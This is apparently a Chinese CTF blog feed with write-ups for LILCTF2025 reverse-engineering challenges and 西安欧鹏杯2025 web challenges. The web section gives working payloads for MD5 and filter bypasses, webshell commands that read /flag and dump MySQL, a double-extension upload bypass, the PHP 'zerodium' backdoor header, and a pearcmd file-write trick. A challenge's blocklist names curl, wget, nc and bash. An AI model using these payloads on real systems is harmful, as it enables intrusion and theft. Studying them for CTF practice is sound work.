class="keyword">return</span> blocks[<span class="number">0</span>] + blocks[<span class="number">1</span>] + blocks[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 配置参数</span></span><br><span class="line"></span><br><span class="line">  custom_b64_table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span></span><br><span class="line"></span><br><span class="line">  target = <span class="string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span></span><br><span class="line"></span><br><span class="line">  t = [<span class="number">0xD</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0xC</span>, <span class="number">0xB</span>, <span class="number">0xA</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment"># 解密步骤</span></span><br><span class="line"></span><br><span class="line">  decoded_b64 = custom_b64decode(target, custom_b64_table)</span><br><span class="line"></span><br><span class="line">  after_bit_op = inverse_bit_operation(decoded_b64)</span><br><span class="line"></span><br><span class="line">  original_data = inverse_neon(after_bit_op, t)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment"># 转换为字符串并输出（过滤非打印字符）</span></span><br><span class="line"></span><br><span class="line">  result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> original_data])</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><img src="/2025/08/16/lilctf-re-wp/image12.png"></p><h2 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h2><p>拿到附件先安装</p><p>然后附加进ida</p><p>定位带main函数</p><p><img src="/2025/08/16/lilctf-re-wp/image13.png"></p><p>进入</p><p>sub_4015E0</p><p>继续分析</p><p><img src="/2025/08/16/lilctf-re-wp/image14.png"></p><p>最开始这个地方有反调试 JMP的地方是JZ</p><p>我们改为JMP 过掉反调试的逻辑</p><p>继续分析</p><p>sub_403400 进行了qt的一些初始化</p><p>进入</p><p>sub_40EE30</p><p><img src="/2025/08/16/lilctf-re-wp/image15.png"></p><p>发现密文</p><p>这里他也进行了一堆初始化，但是我们需要找到槽函数</p><p> *this &#x3D; &amp;off_42F394;</p><p>对这个字符串进行访问</p><p><img src="/2025/08/16/lilctf-re-wp/image16.png"></p><p>发现他调用了一下函数</p><p>sub_411380 sub_4113E0 sub_411430 sub_40FD00 sub_40FFC0</p><p>sub_40FD00 sub_40FFC0  分析后发现是析构函数</p><p>sub_411430 </p><p><img src="/2025/08/16/lilctf-re-wp/image17.png"></p><p>继续跟sub_4113A0</p><p><img src="/2025/08/16/lilctf-re-wp/image18.png"></p><p>sub_410100</p><p><img src="/2025/08/16/lilctf-re-wp/image19.png"></p><p>看见text基本就是获取用户输入的文本了</p><p><img src="/2025/08/16/lilctf-re-wp/image20.png"></p><p>这里也更加确定了 就是注册调用的逻辑</p><p>继续分析，找解密函数</p><p><img src="/2025/08/16/lilctf-re-wp/image21.png"></p><p>sub_40FFF0</p><p>对V22 进行处理</p><p>进入分析</p><p><img src="/2025/08/16/lilctf-re-wp/image22.png"></p><p>发现就是一个循环ASCII 值变化的过程</p><p>如果字符的索引是 偶数，其 ASCII 值会 加1。</p><p>如果字符的索引是 奇数，其 ASCII 值会 减1</p><p>最后写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">encrypted_string</span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  Decrypts the flag by alternating between adding and subtracting 1 from each character&#x27;s ASCII value.</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  decrypted_chars = []</span><br><span class="line">  <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_string):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># Even index (0, 2, 4...)</span></span><br><span class="line">      decrypted_chars.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># Odd index (1, 3, 5...)</span></span><br><span class="line">      decrypted_chars.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) - <span class="number">1</span>))</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(decrypted_chars)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The encrypted strings, concatenated as per the disassembly analysis</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;KJKDSGzR6`bsd5s1q`0t^wdsx`b1mw2oh4mu|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt and print the flag</span></span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(encrypted_string)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The decrypted flag is: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/16/lilctf-re-wp/image23.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这次只做了逆向题，还行，至少没爆0嘻嘻嘻！！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://heisha123.github.io/categories/CTF/"/>
    
    
    <category term="LILCTF2025" scheme="https://heisha123.github.io/tags/LILCTF2025/"/>
    
  </entry>
  
  <entry>
    <title>西安欧鹏杯2025</title>
    <link href="https://heisha123.github.io/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/"/>
    <id>https://heisha123.github.io/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/</id>
    <published>2025-08-15T15:15:25.000Z</published>
    <updated>2025-08-25T09:54:03.801Z</updated>
    
    <content type="html"><![CDATA[<p>拿了好多一血，最后时间快到了才查出来文档，遗憾，没能拿第一！</p><span id="more"></span><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image1.png"></p><p>拿了好多一血，最后时间快到了才查出来文档，遗憾，没能拿第一！</p><h5 id="ez-cookie"><a href="#ez-cookie" class="headerlink" title="ez_cookie"></a>ez_cookie</h5><p>直接访问&#x2F;set_flag.php</p><p>看响应 cookie</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image2.png"></p><h5 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h5><p>题目提示 robots.txt</p><p>直接访问</p><p>发现<a href="http://www.zip/">www.zip</a></p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image3.png"></p><p>拖入010分析</p><p>00 09 发现伪加密，直接改为00</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image4.png"></p><p>保存</p><p>直接解压</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image5.png"></p><p>然后直接访问ip.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff </span>= <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否等于指定 IP</span></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$xff </span>=== <span class="string">&#x27;11.22.33.44&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接伪造 X_FORWARDED_FOR </p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image6.png"></p><h5 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h5><p>f12查看源码</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image7.png"></p><p>直接访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;test1&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;test1&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;test2&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;test2&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>!==<span class="variable">$b</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|paste|cut|dd|flag|more|less|head|sort|tail|system|exec|shell_exec|tac|od|vi|vim|nl|rev|grep|awk|sed|perl|python|php|ruby|base64|xxd|hexdump|strings|curl|wget|nc|netcat|telnet|ftp|ssh|scp|find|locate|whereis|which|ld|gcc|make|sh|bash|zsh|read|cmp|tee|\(|\)|\&#123;|\&#125;|\`|\*|\?|&lt;|&gt;|\&quot;|\&#x27;|&#123;0-9&#125;| |\\$|\./i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye~~~~~~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;See You~~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多读文件的函数</p><p>有漏网之鱼</p><p>然后MD5弱碰撞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?test1[]=1&amp;test2[]=2&amp;cmd=uniq%09/%5BF%5Dlag</span><br><span class="line">?test1[]=1&amp;test2[]=2&amp;cmd=pr%09/%5BF%5Dlag</span><br></pre></td></tr></table></figure><h5 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h5><p>非预期</p><p>发现后门 &#x2F;shell.php</p><p>访问</p><p>直接浏览器搜索flag</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image8.png"></p><p>预期解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image9.png"></p><p>在读一下connect.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;cat connect.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image10.png"></p><p>发现数据库uname,password,连接</p><p>尝试用navicat进行远程连接失败</p><p>考虑本地连接查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php?cmd=system(&quot;mysql -uroot -p123456 -e&#x27;use ctf;show tables;&#x27;&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image11.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php?cmd=system(&quot;mysql -uroot -p123456 -e&#x27;use ctf;select * from flag;&#x27;&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image12.png"></p><h5 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 简单表单：&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;button&gt;upload&lt;/button&gt;&lt;/form&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) || <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Please select a file to upload.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uploadDir </span>= <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads&#x27;</span>;           <span class="comment">// 可被 Web 直访的目录</span></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$origName  </span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];        </span><br><span class="line"><span class="variable">$tmpPath   </span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$mimeClaim </span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];        </span><br><span class="line"></span><br><span class="line"><span class="variable">$allowedExtPattern </span>= <span class="string">&#x27;/\.(jpg|jpeg|png|gif)/i&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$allowedExtPattern</span>, <span class="variable">$origName</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$parts </span>= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$origName</span>);</span><br><span class="line"><span class="variable">$ext   </span>= <span class="keyword">isset</span>(<span class="variable">$parts</span>[<span class="number">1</span>]) ? <span class="title function_ invoke__">strtolower</span>(<span class="variable">$parts</span>[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedList </span>= [<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowedList</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;fuck off!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$mimeClaim</span>, <span class="string">&#x27;image/&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;fuck off!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$destPath </span>= <span class="variable">$uploadDir </span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$origName</span>;</span><br><span class="line"><span class="comment">// 移动上传文件</span></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpPath</span>, <span class="variable">$destPath</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;上传成功：uploads/&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$origName</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个过滤写得很有问题，只要包含.jpg类似的都能很轻松的绕过过滤</p><p>比如我们上传shell.jpg.php 也可以绕过</p><p>正常抓取一个上传的数据包</p><p>然后去请求网站改包</p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image13.png"></p><p>在访问</p><p><code>/uploads/shell.jpg.php?1=system(&#39;cat /flag&#39;);</code></p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image14.png"></p><h5 id="php-backdoor"><a href="#php-backdoor" class="headerlink" title="php_backdoor"></a>php_backdoor</h5><p>访问后发现提示</p><p>php 官方git被黑,入侵者植入后门以便后续攻击</p><p>谷歌搜索相关漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vulhub/php/8.1-backdoor/README.zh-cn.md at master · vulhub/vulhub</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: yzctf.nxoupeng.com:<span class="number">33671</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agentt: zerodiumvar_dump(system(&#x27;cat /flag&#x27;));</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image15.png"></p><h5 id="includer"><a href="#includer" class="headerlink" title="includer"></a>includer</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">//flag.php 需要你读取哦</span><br><span class="line">$flag = $_GET[&#x27;flag&#x27;];</span><br><span class="line">if(isset($flag) &amp;&amp; !preg_match(&#x27;/base64|rot13/i&#x27;,$flag))&#123;</span><br><span class="line">    @include($flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;fuck off!!!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>提示:一道中等难度文件包含题目，记得用编码哦，尤其需要考虑utf8 utf16等</p><p>根据提示想到用伪协议编码来读取</p><p><code>?flag=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p><p><img src="/2025/08/15/%E8%A5%BF%E5%AE%89%E6%AC%A7%E9%B9%8FCTF-JGWEB-%E7%AC%AC%E4%BA%8C/image16.png"></p><h5 id="include-better"><a href="#include-better" class="headerlink" title="include_better"></a>include_better</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|compress|rot|base|filter/i&quot;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;oupeng&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;oupeng&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;oupeng&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fuck off!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目提示用裸文件包含技巧</p><p>想到用pearcmd.php的巧妙利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?+config-create+/&amp;oupeng=/usr/local/lib/php/pearcmd&amp;/&lt;?=system(&#x27;cat$&#123;IFS&#125;/flag&#x27;)?&gt;+/tmp/hello.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: yzctf.nxoupeng.com:33674</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure><p><img 